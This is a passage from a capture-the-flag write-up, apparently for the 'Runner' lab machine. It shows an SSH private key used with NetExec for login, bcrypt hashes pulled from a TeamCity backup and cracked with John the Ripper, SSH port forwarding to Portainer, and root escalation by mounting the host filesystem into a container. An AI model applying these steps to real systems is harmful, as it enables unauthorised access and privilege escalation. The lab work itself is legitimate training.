</span></span></span><span class=line><span class=cl><span class=go>EKJATR8rOQgt3xHr+exgkGwLc72Q61AAAAwQDO2j6MT3aEEbtgIPDnj24W0xm/r+c3LBW0
</span></span></span><span class=line><span class=cl><span class=go>axTWDMGzuA9dg6YZoUrzLWcSU8cBd+iMvulqkyaGud83H3C17DWLKAztz7pGhT8mrWy5Ox
</span></span></span><span class=line><span class=cl><span class=go>KzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAW
</span></span></span><span class=line><span class=cl><span class=go>QHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5M
</span></span></span><span class=line><span class=cl><span class=go>KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>but I don&rsquo;t have a user. So this key is not very useful yet.</p><ul><li>Back to <code>TeamCity</code> panel, at <code>Administration</code> I can see a <code>Users</code> option. Clicking on it shows a table:</li></ul><p><img alt="Runner 6" src=/pentesting/images/Runner_6.png></p><p>where I can see the users I have added testing the different scripts. I can see also 2 users: <code>john</code> and <code>matthew</code>.</p><ul><li>I save these users into a file called <code>potential_users.txt</code> and check with <code>NetExec</code> if we can log in with any of these users via <code>SSH</code> with the provided key:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.13 -u potential_users.txt --key-file id_rsa -p &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.13     22     10.10.11.13      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.13     22     10.10.11.13      [-] matthew: (keyfile: id_rsa) Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.13     22     10.10.11.13      [+] john: (keyfile: id_rsa)  (non root) Linux - Shell access!
</span></span></span></code></pre></div><ul><li>So this key works for the user <code>john</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i id_rsa john@10.10.11.13
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>john@runner:~$
</span></span></span></code></pre></div><p>where we can get the user flag at <code>john</code> home directory.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>I note that we have 2 users in this machine as we suspected, <code>john</code> and <code>matthew</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john@runner:~$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>john  matthew
</span></span></span></code></pre></div><ul><li>Now that I have usernames, I also check if they were present in the <code>backup</code> compressed file we downloaded. If I search for <code>john</code> user we have:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo grep -ri &#34;john&#34; .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./database_dump/comments:201, -42, 1709746543407, &#34;New username: \&#39;admin\&#39;, new name: \&#39;John\&#39;, new email: \&#39;john@runner.htb\&#39;&#34;
</span></span></span><span class=line><span class=cl><span class=go>./database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1716949177384, BCRYPT
</span></span></span></code></pre></div><p>where I can see a hash that I save.
If I search for <code>matthew</code> I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo grep -ri &#34;matthew&#34; .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./config/projects/AllProjects/project-config.xml.1:  &lt;description&gt;Matthew&#39;s projects&lt;/description&gt;
</span></span></span><span class=line><span class=cl><span class=go>./config/_trash/AllProjects.project1/project-config.xml:  &lt;description&gt;Matthew&#39;s projects&lt;/description&gt;
</span></span></span><span class=line><span class=cl><span class=go>./database_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
</span></span></span><span class=line><span class=cl><span class=go>./database_dump/vcs_username:2, anyVcs, -1, 0, matthew
</span></span></span><span class=line><span class=cl><span class=go>./system/pluginData/audit/configHistory/projects/project1/config.xml.1:  &lt;description&gt;Matthew&#39;s projects&lt;/description&gt;
</span></span></span></code></pre></div><p>where I can see another hash.</p><ul><li>I save these hashes into my attacker machine and attempt to crack with a <code>Brute Force Password Cracking</code> with <code>JohnTheRipper</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt hashes_found
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 128 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>piper123         (matthew)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:06:22 2.66% (ETA: 04:06:53) 0.002615g/s 1160p/s 1296c/s 1296C/s 303606..301298
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span></code></pre></div><p>where we have credentials: <code>matthew:piper123</code>. These credentials do not work to change to <code>matthew</code> user inside the machine, so save them for later.</p><ul><li>Back to the victim machine, I search for internal ports open:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john@runner:~$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>State               Recv-Q              Send-Q                           Local Address:Port                             Peer Address:Port              Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:9000                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:5005                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                             127.0.0.53%lo:53                                    0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:9443                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                    0.0.0.0:80                                    0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                    0.0.0.0:22                                    0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:8111                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                         *:8000                                        *:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                       [::]:80                                       [::]:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                       [::]:22                                       [::]:*
</span></span></span></code></pre></div><p>After exploring them, I note that port <code>9000</code>, that was not publicly available, is a website thanks to <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john@runner:~$ curl -s http://localhost:9000 | head -n 3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!doctype html&gt;&lt;html lang=&#34;en&#34; ng-app=&#34;portainer&#34; ng-strict-di data-edition=&#34;CE&#34;&gt;&lt;head&gt;&lt;meta charset=&#34;utf-8&#34;/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta name=&#34;description&#34; content=&#34;&#34;/&gt;&lt;meta name=&#34;author&#34; content=&#34;Portainer.io&#34;/&gt;&lt;meta http-equiv=&#34;cache-control&#34; content=&#34;no-cache&#34;/&gt;&lt;meta http-equiv=&#34;expires&#34; content=&#34;0&#34;/&gt;&lt;meta http-equiv=&#34;pragma&#34; content=&#34;no-cache&#34;/&gt;&lt;base id=&#34;base&#34;/&gt;&lt;script&gt;if (window.origin == &#39;file://&#39;) {
</span></span></span><span class=line><span class=cl><span class=go>        // we are loading the app from a local file as in docker extension
</span></span></span><span class=line><span class=cl><span class=go>        document.getElementById(&#39;base&#39;).href = &#39;http://localhost:49000/&#39;;
</span></span></span></code></pre></div><ul><li>Since we have <code>SSH</code> credentials, we can attempt a <code>Local Port Forwarding</code> to gain access to this internal port. I logout from the current <code>SSH</code> session, and re-connect to the target machine, but this time converting port <code>9000</code> of the target machine in my port <code>9000</code> as well. For this we run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i id_rsa -L 9000:localhost:9000 john@10.10.11.13
</span></span></span></code></pre></div><p>and now, visiting <code>http://localhost:9000</code> on my web browser I can see a website running <code>Portainer</code>:</p><p><img alt="Runner 7" src=/pentesting/images/Runner_7.png></p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>Portainer</code> is a tool that can be used to monitor your Docker installation, interact with containerized apps, and deploy new stacks with minimal effort. A single <code>Portainer</code> instance can connect to multiple <code>Docker</code> hosts, centralizing your container</div></div><ul><li>I attempt to log in with the only credentials we have found, the ones for the user <code>matthew</code>. And they work. Once in we can see:</li></ul><p><img alt="Runner 8" src=/pentesting/images/Runner_8.png></p><ul><li>If I click on <code>primary</code> container now we have some options displayed at the left side. First, it is recommended to add a <code>Volume</code> (what is a <code>Volume</code> is better explained <a href=https://docs.portainer.io/user/docker/volumes class=external-link target=_blank rel=noopener>here</a>). Basically, &ldquo;a volume is a data storage area that can be mounted into a container to provide persistent storage&rdquo;. So we can create a <code>Volume</code> to avoid problems in the future. <a href=https://docs.portainer.io/user/docker/volumes/add class=external-link target=_blank rel=noopener>Following the instructions of how to add a Volume on Portainer</a>, we can go to <code>Volume</code>, then <code>Add volume</code>. Then just name it as <code>test</code> and as <code>Driver</code> select <code>local</code>. Finally, I want it to be a <code>Private</code> volume.</li></ul><p><img alt="Runner 10" src=/pentesting/images/Runner_10.png></p><p>where we click on <code>add driver option</code> and add the options: <code>driver:/</code>, <code>o:bind</code>, <code>type:none</code> since we want to create a <code>Volume</code> <a href=https://docs.portainer.io/user/docker/volumes/add#adding-a-tmpfs-volume class=external-link target=_blank rel=noopener>as is explained here</a>.</p><ul><li>Clicking on <code>Volume</code> and then our just created <code>Volume</code>, we should see:</li></ul><p><img alt="Runner 18" src=/pentesting/images/Runner_18.png></p><ul><li>Once we have created a <code>Volume</code>, go to <code>Containers</code> and create a new container with <code>Add container</code> option.</li></ul><p><img alt="Runner 13" src=/pentesting/images/Runner_13.png></p><p>as <code>Image</code> I set the option <code>teamcity:latest</code>, since, if we visit <code>Images</code> section we can see 2 images already available:</p><p><img alt="Runner 14" src=/pentesting/images/Runner_14.png></p><p>so I just selected the one that was not being used.</p><ul><li>Scrolling down in the container creator I can see a section called <code>Advanced container settings</code>. There, at <code>Command & logging</code> tab I will select the option <code>Interactive & TTY</code>:</li></ul><p><img alt="Runner 11" src=/pentesting/images/Runner_11.png></p><p>and at <code>Volumes</code> tab, click on <code>+ map additional volume</code>. I will put as <code>container</code> the value <code>/mnt/root</code> and select the volume I have just created (which I have named <code>test</code>):</p><p><img alt="Runner 12" src=/pentesting/images/Runner_12.png></p><ul><li>Finally I click on <code>Deploy the container</code>, wait and it is created as we can check at <code>Containers</code> section:</li></ul><p><img alt="Runner 15" src=/pentesting/images/Runner_15.png></p><ul><li>Clicking on my container I can see a <code>Console</code> option at the bottom of the first window:</li></ul><p><img alt="Runner 16" src=/pentesting/images/Runner_16.png></p><ul><li>Clicking on it spawn a new windows that asks us as which user we want to run this console. We just put <code>root</code> user and click on <code>Connect</code>:</li></ul><p><img alt="Runner 17" src=/pentesting/images/Runner_17.png></p><ul><li>A new shell spawns, but I note that at <code>/mnt/root</code> it has a copy of <code>/</code> directory of the original machine. As we can see, the file <code>root.txt</code> is located at <code>/mnt/root/root</code>, so we can read it and machine solved. There is no <code>id_rsa</code> file for <code>root</code>, so we cannot connect via <code>SSH</code>, but we could directly read the flag:</li></ul><p><img alt="Runner 19" src=/pentesting/images/Runner_19.png></p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>